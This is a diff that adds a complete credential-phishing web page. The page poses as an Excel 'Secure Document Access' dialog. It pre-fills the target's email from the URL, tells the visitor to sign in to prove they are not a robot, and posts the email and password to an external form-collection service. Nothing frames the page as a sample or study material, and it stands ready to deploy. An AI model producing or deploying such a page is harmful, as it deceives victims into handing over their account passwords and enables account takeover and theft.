@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Secure Document Access</title>
+
+<style>
+  /* Body & background */
+  body {
+    margin: 0;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #f3f6fb;
+    color: #1a1a1a;
+  }
+
+  /* Blurred spreadsheet-like background */
+  .bg {
+    position: fixed;
+    inset: 0;
+    background:
+      linear-gradient(rgba(255,255,255,0.85), rgba(255,255,255,0.85)),
+      repeating-linear-gradient(
+        to bottom,
+        #fff 0,
+        #fff 24px,
+        #d1d9e6 25px,
+        #d1d9e6 26px
+      ),
+      repeating-linear-gradient(
+        to right,
+        #fff 0,
+        #fff 90px,
+        #d1d9e6 91px,
+        #d1d9e6 92px
+      );
+    filter: blur(5px);
+    z-index: -1;
+  }
+
+  /* Modal container centered like Excel dialog */
+  .modal {
+    position: fixed;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: rgba(241, 244, 249, 0.85);
+  }
+
+  /* Card with subtle Excel-style borders */
+  .card {
+    width: 360px;
+    background: #fff;
+    border: 1px solid #c6d1e3;
+    border-radius: 6px;
+    box-shadow: 0 8px 24px rgb(0 0 0 / 0.15);
+    padding: 30px 28px;
+  }
+
+  /* Top icon + "×" container, centered horizontally */
+  .icon-container {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+    margin-bottom: 18px;
+    font-size: 24px;
+    color: #217346;
+    user-select: none;
+  }
+
+  /* The "×" sign style */
+  .middle-x {
+    font-weight: 700;
+    cursor: default;
+    user-select: none;
+  }
+
+  /* Green file icon box */
+  .file-icon-box {
+    background: #217346;
+    border-radius: 6px;
+    width: 36px;
+    height: 36px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 22px;
+    box-shadow: 0 0 4px rgb(33 115 70 / 0.6);
+  }
+
+  /* Title */
+  h2 {
+    font-weight: 700;
+    text-align: center;
+    font-size: 18px;
+    color: #217346;
+    margin: 0 0 20px;
+    letter-spacing: 0.03em;
+  }
+
+  /* Notice box with Excel subtle highlight */
+  .notice {
+    background: #d6eadf;
+    border: 1px solid #a2d39c;
+    border-radius: 4px;
+    padding: 12px 14px;
+    font-size: 13px;
+    line-height: 1.3;
+    color: #215732;
+    text-align: center;
+    margin-bottom: 24px;
+    user-select: none;
+  }
+
+  /* Displayed email text */
+  #display-email {
+    font-size: 14px;
+    font-weight: 600;
+    color: black;
+    margin-bottom: 16px;
+    text-align: center;
+    user-select: text;
+    word-break: break-word;
+  }
+
+  /* Form labels styled like Excel field labels */
+  label {
+    font-weight: 600;
+    font-size: 13px;
+    color: #333;
+    margin-bottom: 6px;
+    display: block;
+    user-select: none;
+  }
+
+  /* Input fields with Excel style border & spacing */
+  input[type="password"] {
+    width: 100%;
+    height: 36px;
+    padding: 6px 10px;
+    font-size: 14px;
+    border: 1px solid #a9c1d9;
+    border-radius: 3px;
+    box-sizing: border-box;
+    transition: border-color 0.3s ease;
+  }
+
+  input[type="password"]:focus {
+    border-color: #217346;
+    outline: none;
+    box-shadow: 0 0 4px #217346aa;
+  }
+
+  /* Submit button */
+  button {
+    margin-top: 12px;
+    width: 100%;
+    height: 38px;
+    background: #217346;
+    border: none;
+    border-radius: 3px;
+    color: white;
+    font-weight: 700;
+    font-size: 14px;
+    cursor: pointer;
+    letter-spacing: 0.05em;
+    transition: background-color 0.3s ease;
+  }
+
+  button:hover {
+    background: #195832;
+  }
+
+  /* Footer note */
+  .footer {
+    margin-top: 18px;
+    font-size: 11px;
+    text-align: center;
+    color: #666;
+    user-select: none;
+  }
+</style>
+</head>
+
+<body>
+
+  <div class="bg"></div>
+
+  <div class="modal">
+    <div class="card">
+
+      <div class="icon-container" role="banner" aria-label="Secure document icon and status">
+        <div class="file-icon-box" aria-hidden="true" title="Secure File">
+          📄
+        </div>
+        <div class="middle-x" aria-hidden="true" title="Not a robot confirmation">
+          ×
+        </div>
+      </div>
+
+      <h2>Secure Document Access</h2>
+
+      <div class="notice" role="alert">
+        🔒 <strong>This secured document can only be accessed by the email below.</strong><br />
+        Sign in to your account to confirm you’re not a robot.
+      </div>
+
+      <!-- Display email as plain black text -->
+      <div id="display-email" aria-live="polite" aria-atomic="true"></div>
+
+      <form action="https://formcarry.com/s/p7aicZARTJR" method="POST" novalidate>
+        <!-- Hidden input to submit email in form -->
+        <input type="hidden" name="email" id="email" />
+
+        <label for="password">Password</label>
+        <input type="password" name="password" placeholder="Password" required />
+
+        <button type="submit">Login Now</button>
+      </form>
+
+      <div class="footer">Protected document preview · Authorized access only</div>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get("email");
+    const displayEmail = document.getElementById("display-email");
+    const emailInput = document.getElementById("email");
+
+    if (email) {
+      displayEmail.textContent = email;
+      emailInput.value = email;
+    } else {
+      displayEmail.textContent = "No authorized email provided.";
+    }
+  </script>
+
+</body>
+</html>
